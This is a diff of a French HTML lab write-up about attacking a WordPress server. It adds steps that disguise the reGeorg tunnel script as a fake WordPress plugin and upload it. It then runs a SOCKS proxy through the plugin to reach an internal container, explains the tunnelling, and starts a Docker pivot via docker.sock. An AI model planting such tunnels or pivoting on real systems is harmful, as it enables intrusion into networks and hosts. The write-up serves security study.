@@ -345,67 +345,154 @@ wpscan --url http://192.168.56.104:8000 -U bob -P /usr/share/wordlist/rockyou.tx
             <h2 class="my-5">Etape 4 : Tunneling and cross protocole </h2>
 
             <ol>
-                <li>Récupéré le projet Regeorg sur github</li>
-                <ul>
-                    <li>
-                        <pre><code class="language-bash">┌──(kali㉿kali)-[~]
-└─$ git clone https://github.com/sensepost/reGeorg.git</code></pre>
-                    </li>
-                </ul>
-                <li>Prépare la charge utile</li>
-                <ul>
-                    <li>Création d’un fichier d’en-tête WordPress puis on rajoute le scipt tunnel de regeorg</li>
-                    <li>
-                        <pre><code class="language-bash">
-─$ cat <<-'EOF' >tunnel/head.php
-<?php
-/*
-* Plugin Name: tunnel
-* Version: 1.0.00
-* Author: Anonymous
-* Author URI: http://anonymous.com
-* License: GPL2
-*/
-?>
-
-EOF
-                
-$ cat tunnel/tunnel.php >> tunnel/head.php
-$ mv tunnel/head.php tunnel.php
-$ zip -r -9 tunnel.zip tunnel
-                            
-                            </code></pre>
-                    </li>
-                </ul>
-                <li>On ajoute notre charge en tant que plugin wordpress </li>
-                <ul>
-                    <li><img src="./img/wp_plugin_vd.png" class="img-fluid my-5" alt="img plugin"></li>
-                    <li><img src="./img/activation_plugin_vd.png" class="img-fluid" alt="activation plugin"></li>
-                </ul>
-                <li>Lancer le script regeorg et activation du proxy local</li>
-                <ul>
-                    <li>
-                        <pre><code class="language-bash">python2 /home/kali/reGeorg/reGeorgSocksProxy.py -l 127.0.0.1 -p 8087 -u http://192.168.56.104:8000/wp-content/plugins/tunnel/tunnel.php -v DEBUG</code></pre>
-                    </li>
-                </ul>
-                <li><strong>Fonctionnement du tunnel avec le protocole SOCKS5</strong></li>
-                <ol>
-                    <li class="li-title"><strong>Etape 1:</strong>
-                        <ul>
-                            <li>Générer une trame ssh avec comme IP Dest celle du conteneur cible qui nous est pas
-                                accessible de base, et l’envoyer a nôtre proxy qui est lier a nôtre tunnel.php</li>
-                        </ul>
-                    </li>
-                    <li class="li-title"><strong>Etape 2 :</strong></li>
+                <li>Récupéré le projet Regeorg sur github
                     <ul>
-                        <li></li>
+                        <li>
+                            <pre><code class="language-bash">┌──(kali㉿kali)-[~]
+└─$ git clone https://github.com/sensepost/reGeorg.git</code></pre>
+                        </li>
                     </ul>
-                    <li class="li-title"><strong>Etape 3 :</strong></li>
-                    <li class="li-title"><strong>Etape 4 :</strong></li>
-                    <li class="li-title"><strong>Etape 5 :</strong></li>
-                </ol>
+                </li>
+
+                <li>Prépare la charge utile
+                    <ul>
+                        <li>Création d’un fichier d’en-tête WordPress puis on rajoute le scipt tunnel de regeorg</li>
+                        <li>
+                            <pre><code class="language-bash">
+    ─$ cat <<-'EOF' >tunnel/head.php
+    <?php
+    /*
+    * Plugin Name: tunnel
+    * Version: 1.0.00
+    * Author: Anonymous
+    * Author URI: http://anonymous.com
+    * License: GPL2
+    */
+    ?>
+    
+    EOF
+                    
+    $ cat tunnel/tunnel.php >> tunnel/head.php
+    $ mv tunnel/head.php tunnel.php
+    $ zip -r -9 tunnel.zip tunnel
+                                
+                                </code></pre>
+                        </li>
+                    </ul>
+                </li>
+
+                <li>On ajoute notre charge en tant que plugin wordpress <ul>
+                        <li><img src="./img/wp_plugin_vd.png" class="img-fluid my-5" alt="img plugin"></li>
+                        <li><img src="./img/activation_plugin_vd.png" class="img-fluid" alt="activation plugin"></li>
+                    </ul>
+                </li>
+
+                <li>Lancer le script regeorg et activation du proxy local <ul>
+                        <li>
+                            <pre><code class="language-bash">python2 /home/kali/reGeorg/reGeorgSocksProxy.py -l 127.0.0.1 -p 8087 -u http://192.168.56.104:8000/wp-content/plugins/tunnel/tunnel.php -v DEBUG</code></pre>
+                        </li>
+                    </ul>
+                </li>
+
+                <li><strong>Fonctionnement du tunnel avec le protocole SOCKS5</strong>
+                    <ol>
+                        <li><strong>Etape 1:</strong>
+                            <ul>
+                                <li>Générer une trame ssh avec comme IP Dest celle du conteneur cible qui nous est pas
+                                    accessible de base, et l’envoyer a nôtre proxy qui est lier a nôtre tunnel.php</li>
+                            </ul>
+                        </li>
+                        <li><strong>Etape 2 :</strong>
+                            <ul>
+                                <li>Le protocole SOCKS 5 que utilise le script Regeorg encapsule le paquet ssh précédant
+                                    par SOCKS 5</li>
+                            </ul>
+                        </li>
+
+                        <li><strong>Etape 3 :</strong>
+                            <ul>
+                                <li>Le script Regeorg envoie une requête HTTP POST a tunnel.php avec les donnée SOCKS 5
+                                    a l’intérieur donc sont encore encapsuler par HTTP</li>
+                            </ul>
+                        </li>
+                        <li><strong>Etape 4 :</strong>
+                            <ul>
+                                <li>Le plugin tunnel.php qui est sur le serveur désencapsule le paquet HTTP et exécutes
+                                    les instruction SOCK 5 se qui crée une connexion avec la cible et transfère ensuite
+                                    les données encapsulées à travers cette connexion.
+                                </li>
+                            </ul>
+                        </li>
+                        <li><strong>Etape 5 :</strong>
+                            <ul>
+                                <li>Le plugin agit agit aussi comme un proxy:
+                                    <ul>
+                                        <li>Il lit les réponses provenant de la cible</li>
+                                        <li>Il réencapsule ces réponses dans un format SOCKS 5</li>
+                                        <li>Il les renvoie via HTTP au proxy côté de l’attaquant </li>
+                                    </ul>
+                                </li>
+                            </ul>
+                        </li>
+                    </ol>
+                    <img src="./img/schema_SOCKS_vd.png" class="img-fluid" alt="schema protocole SOCKS5">
+                </li>
+
 
             </ol>
+        </section>
+
+        <section>
+            <h2>Activation Regeorg</h2>
+
+            <p>Nous allons utiliser la commande suivante pour activer le tunnel regeorg sur nôtre interface local</p>
+            <pre><code class="language-bash">python2 /home/kali/reGeorg/reGeorgSocksProxy.py -l 127.0.0.1 -p 8087 -u http://192.168.1.15:8000/wp-content/plugins/tunnel/tunnel.php -v DEBUG</code></pre>
+
+            <img src="./img/resultat _ssh_conteneur_vd.png" class="img-fluid my-5" alt="resultat du ssh">
+
+        </section>
+
+        <section>
+            <h2>Pivot Docker</h2>
+
+            <fieldset>
+                <legend><i class="bi bi-lightbulb-fill" style="color: yellow;"></i></legend>
+                <p>On peut remarquer que se conteneur a accès a <span class="semi-code"> /var/run/docker.sock </span>
+                    qui est utilisé pour communiquer
+                    avec l’API Docker donc peut interagir avec le démon Docker de l’host.
+
+                    → Le mode easy permet de communiquer directement avec cette API</p>
+            </fieldset>
+
+            <ul>
+                <li>L’objectif maintenant est d’installer le client docker sur le conteneur pour pouvoir exécuter des
+                    commande docker via l’API</li>
+                <li>Sachant que scp est désactiver j’installe netcat et wget sur le conteneur
+                    <ul>
+                        <li>
+                            <pre><code class="language-bash">apt-get update
+apt-get install netcat
+apt-get install wget</code></pre>
+                        </li>
+                    </ul>
+                </li>
+                <li>J’installe aussi le client docker sur ma machine et je la zip
+                    <ul>
+                        <li>
+                            <pre><code class="language-bash">mkdir docker_deb/
+cd docker_deb/
+apt download docker-ce
+apt depends -i docker-ce | awk '{print $2}' | xargs apt download
+tar cvzf ../docker.tar.gz .</code></pre>
+                        </li>
+                    </ul>
+                </li>
+                <li>J’ouvre un server web avec python sur ma machine et je récupère le zip sur le conteneur
+                    <ul>
+                        <li><img src="./img/wget_docker_ci_vd.png" class="img-fluid" alt="image"></li>
+                    </ul>
+                </li>
+            </ul>
         </section>
     </div>
 
